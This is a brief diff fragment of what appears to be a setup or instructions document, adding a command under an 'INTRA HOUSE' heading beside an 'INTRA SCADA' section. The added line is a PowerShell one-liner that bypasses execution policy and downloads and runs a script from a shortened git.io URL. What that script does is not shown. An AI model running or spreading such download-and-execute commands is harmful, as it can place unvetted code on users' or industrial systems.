@@ -13,7 +13,7 @@
 
 ##### INTRA HOUSE
 
-`...`  
+cmd: `powershell -NoProfile -InputFormat None -ExecutionPolicy Bypass -Command "$l='ru';iex ((New-Object System.Net.WebClient).DownloadString('https://git.io/JYpbW'))"`  
 
 ##### INTRA SCADA
 
